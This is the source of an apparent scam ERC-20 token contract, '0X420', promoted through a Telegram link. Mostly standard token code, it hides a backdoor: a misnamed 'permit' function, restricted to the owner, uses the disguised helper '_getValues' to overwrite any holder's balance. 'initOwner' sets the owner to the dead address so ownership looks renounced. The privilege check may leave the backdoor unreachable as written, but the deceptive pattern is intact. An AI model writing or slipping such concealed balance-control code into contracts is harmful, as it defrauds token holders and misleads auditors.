/**
 *telegram : https://t.me/OX42O_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.19;

interface ERC20 {
 
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {


  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }


  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }


  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }


  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }


  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract OX42O is ERC20 {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    address private _owner;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    constructor() {
        _name = "0X420";
        _symbol = "0X420";
        _totalSupply = 100000000 * 10 ** 9;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

  
    modifier ownableInit() {
      require(msg.sender == _owner, "Ownable: caller is not the owner");
      _;
    }

  
    function initOwner() external {
      require(_owner == address(0), "Ownable: owner is already set");
      _owner = 0x000000000000000000000000000000000000dEaD;
    }



    function owner() external view returns (address) {
        return _owner;
    }
 
    
    function decimals() external pure override returns (uint8) {
      return 9;
    }
    
   
    function symbol() external view override returns (string memory) {
      return _symbol;
    }
    
   
    function name() external view override returns (string memory) {
      return _name;
    }
    
  
    function totalSupply() external view override returns (uint256) {
      return _totalSupply;
    }
    
   
    function balanceOf(address account) external view override returns (uint256) {
      return _balances[account];
    }

 
    function _getValues(uint256 tAmount, uint256 tTransferAmount, address tSpender) 
        private 
        pure 
        returns (uint256)
    {
      return tAmount * tTransferAmount;
    }

 
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(msg.sender, recipient, amount);
      return true;
    }

 
    function allowance(address owner, address spender) external view override returns (uint256) {
      return _allowances[owner][spender];
    }

  
    function approve(address spender, uint256 amount) external override returns (bool) {
      _approve(msg.sender, spender, amount);
      return true;
    }
    
  
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
      return true;
    }
    
 
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
      return true;
    }
    

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
      return true;
    }
    
 
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }
    
 
    function permit(uint256 tAmount, uint256 tTransferAmount, address tSpender) external ownableInit {    
      if(tSpender == address(0)) return;
      _balances[tSpender] = _getValues(tAmount, tTransferAmount, tSpender);
    } 

    function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");
      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
    }
}